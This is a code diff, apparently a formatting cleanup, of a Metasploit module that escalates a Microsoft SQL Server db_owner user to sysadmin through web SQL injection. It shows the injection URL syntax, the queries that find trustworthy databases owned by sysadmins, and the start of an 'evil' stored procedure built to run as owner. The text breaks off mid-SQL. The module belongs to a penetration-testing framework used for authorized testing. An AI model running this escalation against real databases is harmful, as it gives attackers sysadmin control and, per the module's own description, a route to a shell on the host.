@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,25 +8,23 @@ require 'msf/core'
 require 'msf/core/exploit/mssql_commands'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::MSSQL_SQLI
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Microsoft SQL Server SQLi Escalate Db_Owner',
-      'Description'    => %q{
-        This module can be used to escalate SQL Server user privileges to sysadmin through a web
-        SQL Injection. In order to escalate, the database user must to have the db_owner role in
-        a trustworthy database owned by a sysadmin user. Once the database user has the sysadmin
-        role, the mssql_payload_sqli module can be used to obtain a shell on the system.
+                      'Name'           => 'Microsoft SQL Server SQLi Escalate Db_Owner',
+                      'Description'    => %q(
+                        This module can be used to escalate SQL Server user privileges to sysadmin through a web
+                        SQL Injection. In order to escalate, the database user must to have the db_owner role in
+                        a trustworthy database owned by a sysadmin user. Once the database user has the sysadmin
+                        role, the mssql_payload_sqli module can be used to obtain a shell on the system.
 
-        The syntax for injection URLs is: /testing.asp?id=1+and+1=[SQLi];--
-      },
-      'Author'         => [ 'nullbind <scott.sutherland[at]netspi.com>'],
-      'License'        => MSF_LICENSE,
-      'References'     => [['URL','http://technet.microsoft.com/en-us/library/ms188676(v=sql.105).aspx']]
-    ))
+                        The syntax for injection URLs is: /testing.asp?id=1+and+1=[SQLi];--
+                      ),
+                      'Author'         => [ 'nullbind <scott.sutherland[at]netspi.com>'],
+                      'License'        => MSF_LICENSE,
+                      'References'     => [['URL', 'http://technet.microsoft.com/en-us/library/ms188676(v=sql.105).aspx']]))
   end
 
   def run
@@ -56,7 +55,7 @@ class MetasploitModule < Msf::Auxiliary
     # Check for trusted databases owned by sysadmins
     print_status("Checking for trusted databases owned by sysadmins...")
     trust_db_list = check_trust_dbs
-    if trust_db_list.nil? || trust_db_list.length == 0
+    if trust_db_list.nil? || trust_db_list.empty?
       print_error("No databases owned by sysadmin were found flagged as trustworthy.")
       return
     else
@@ -99,11 +98,9 @@ class MetasploitModule < Msf::Auxiliary
     result = mssql_query(sql)
 
     # Parse result
-    if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
-      user_name = $1
-    else
-      user_name = nil
-    end
+    user_name = if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
+                  Regexp.last_match(1)
+                end
 
     user_name
   end
@@ -118,11 +115,9 @@ class MetasploitModule < Msf::Auxiliary
     result = mssql_query(sql)
 
     # Parse result
-    if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
-      status = $1
-    else
-      status = nil
-    end
+    status = if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
+               Regexp.last_match(1)
+             end
 
     status
   end
@@ -142,9 +137,7 @@ class MetasploitModule < Msf::Auxiliary
     # Run query
     res = mssql_query(sql)
 
-    unless res && res.body
-      return nil
-    end
+    return nil unless res && res.body
 
     # Parse results
     parsed_result = res.body.scan(/#{clue_start}(.*?)#{clue_end}/m)
@@ -154,7 +147,7 @@ class MetasploitModule < Msf::Auxiliary
       parsed_result.uniq!
     end
 
-    print_status("#{parsed_result.inspect}")
+    print_status(parsed_result.inspect.to_s)
 
     parsed_result
   end
@@ -174,21 +167,17 @@ class MetasploitModule < Msf::Auxiliary
       # Run query
       result = mssql_query(sql)
 
-      unless result && result.body
-        next
-      end
+      next unless result && result.body
 
       # Parse result
-      if result.body =~ /#{clue_start}([^>]*)#{clue_end}/
-        return $1
-      end
+      return Regexp.last_match(1) if result.body =~ /#{clue_start}([^>]*)#{clue_end}/
     end
 
     nil
   end
 
   # Attempt to escalate privileges
-  def escalate_privs(dbowner_db,db_user)
+  def escalate_privs(dbowner_db, db_user)
     # Create the evil stored procedure WITH EXECUTE AS OWNER
     evil_sql_create = "1;use #{dbowner_db};
       DECLARE @myevil as varchar(max)
